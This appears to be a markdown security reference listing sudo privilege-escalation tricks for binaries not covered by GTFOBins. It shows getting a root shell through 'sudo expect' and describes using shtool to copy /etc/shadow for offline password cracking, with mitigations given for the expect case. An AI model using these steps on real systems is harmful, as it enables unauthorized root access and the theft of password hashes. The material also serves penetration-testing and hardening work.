# Unlisted Sudo Privilege Escalation Binaries (Not on GTFOBins)

This document contains a list of binaries that have **sudo permissions** but are **not listed on GTFOBins** for privilege escalation.  

While **GTFOBins** provides a well-documented collection of sudo-exploitable binaries, new or lesser-known binaries with **potential privilege escalation (PrivEsc) capabilities** may not yet be listed.  

Each binary below is analyzed for privilege escalation techniques, exploitation steps, and possible mitigations.

---

## `expect` - Sudo Privilege Escalation

### **Description**
`expect` is an automation tool that interacts with applications requiring user input. If granted **sudo permissions**, it can be exploited to execute arbitrary commands as root.

### **Exploitation**
If `expect` is allowed with `sudo`, you can escalate privileges using the following:

```sh
sudo /usr/bin/expect
At the expect prompt, execute:

expect1.1> whoami
root
expect1.2> bash
[root@my_privilege user]# id
uid=0(root) gid=0(root) groups=0(root)
Mitigation

    Remove sudo permissions for expect (/usr/bin/expect).
    Restrict expect usage through sudoers configuration.
    Use AppArmor or SELinux to prevent execution of unauthorized commands.
shtool - Sudo Privilege Escalation
Description

shtool is a script utility tool commonly used for installation tasks. If granted sudo permissions, it can be abused to copy sensitive system files (e.g., /etc/shadow) to a location accessible by a lower-privileged user, enabling privilege escalation.
Exploitation

If shtool is available with sudo, you can copy /etc/shadow to a user-accessible directory and attempt password cracking to escalate privileges.

